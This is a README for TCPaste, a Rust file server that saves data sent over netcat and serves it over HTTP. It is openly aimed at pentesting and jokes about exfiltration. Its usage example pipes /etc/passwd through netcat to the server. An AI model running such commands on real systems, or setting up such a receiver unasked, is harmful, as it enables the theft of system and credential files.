# 📂 TCPaste: A Rust-Based File Server

Welcome to **TCPaste**, a single binary, self-hosted file server written in Rust.

🎉 Inspired by tools like [termbin](https://termbin.com), TCPaste provides a modern and efficient way to share and display files via HTTP and TCP protocols directly from your terminal.

## 🚀 Overview

**TCPaste** offers a straightforward method for sharing files using **netcat** and other TCP tools. Whether you need to share (or exfiltrate 😈) logs, code snippets, or other text files, TCPaste is designed to handle it seamlessly.

- **HTTP Server**: List and access files through a web interface with clickable links for easy retrieval.
- **TCP Server**: Send data to be saved into new files, with automatic filename generation and management.

## 🛠️ Features

- **Single Binary**: Simple installation with no dependencies.
- **Self-Hosted**: Operate on your own server without external dependencies.
- **File Sharing**: Browse and retrieve files through an HTTP interface.
- **Automatic Filenames**: Random filenames for files created via TCP connections.

## 📝 Installation

1. **Download the Binary**: [Download the latest release](#) or build from source.
2. **Run the Server**:
   ```bash
   ./tcpaste
   ```

The HTTP server will listen on port 80, and the ingress TCP server will listen on port 8888.

## 🌐 Usage

### HTTP Server

- **List Files**: Navigate to `http://127.0.0.1/` to see all available files with clickable links.
- **Access Files**: Click on any file link or use `GET /<filename>` to retrieve the file contents.

### TCP Server

- **Send Data**: Connect to the TCP server on port 8888 and send data. Each new connection creates a new file in the `files` directory. For instance `cat /etc/passwd | nc 127.0.0.1 8888`

## ⚠️ Security Notes

**This project comes under absolutely no security guarantee**. The HTTP endpoint should not be exposed to the internet, but only face your internal network and be accessible only to you and your collaborators.

## 🧩 License

This project is licensed under the [GNU General Public License (GPL) v3](https://www.gnu.org/licenses/gpl-3.0.html). Feel free to use, modify, and distribute TCPaste according to the GPL terms.

## 🤝 Contributing

Contributions are welcome! If you discover bugs, have feature requests, or wish to contribute, please open an issue or pull request.

Happy pentesting with TCPaste! 🚀
